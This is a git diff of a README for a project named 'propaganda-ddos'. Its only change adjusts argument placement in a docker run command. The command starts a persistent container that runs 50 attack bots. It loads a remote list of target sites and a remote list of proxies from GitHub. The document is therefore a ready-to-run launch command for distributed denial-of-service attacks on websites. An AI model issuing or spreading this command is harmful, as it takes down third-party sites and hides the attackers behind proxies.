@@ -1,8 +1,8 @@
 # propaganda-ddos
 
 ```bash
-docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=30 --dnsres=true \
---onlyproxy=false --bots 50 --checkproxy=true \
+docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=30 \
+--dnsres=true -- --onlyproxy=false --bots 50 --checkproxy=true \
 --sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
 --proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
 ```
